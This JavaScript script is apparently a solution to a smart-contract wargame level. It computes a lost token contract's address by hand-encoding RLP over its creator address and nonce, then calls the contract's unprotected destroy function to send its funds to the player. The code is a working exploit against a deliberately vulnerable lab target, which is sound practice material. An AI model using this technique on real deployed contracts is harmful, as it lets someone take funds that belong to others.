const level18 = async (web3, SimpleToken) => {
    const targetAddress = '847e3183c133d7b60ea927652cf32f88da335dfb';
    console.log(`Exploiting Level18 target 0x${targetAddress}...`);

    console.log('Calculating the address of the first SimpleToken contract that was deployed...');
    // address = Keccak(RLP([ recoveryContractAddress, 1 ]))[:-20]
    // we could use a library but in the interests of understanding RLP, I will calculate it manually
    // note that the web3 keccak function accepts a hex string
    const encodeNonce = '01';
    const encodeAddr = (0x80 + targetAddress.length / 2).toString(16) + targetAddress;
    const encodeList = (0xc0 + encodeAddr.length / 2 + encodeNonce.length / 2).toString(16) + encodeAddr + encodeNonce;
    const tokenContractAddress = '0x' + (await web3.utils.keccak256(`0x${encodeList}`)).slice(26); // skip '0x' + 12 bytes * 2 hex characters

    console.log('Retrieving token contract...');
    const tokenContract = await SimpleToken.at(tokenContractAddress);

    console.log('Retrieving current address...');
    const player = (await web3.eth.getAccounts())[0];

    console.log('Recovering funds...');
    await tokenContract.destroy(player);
};

module.exports = level18;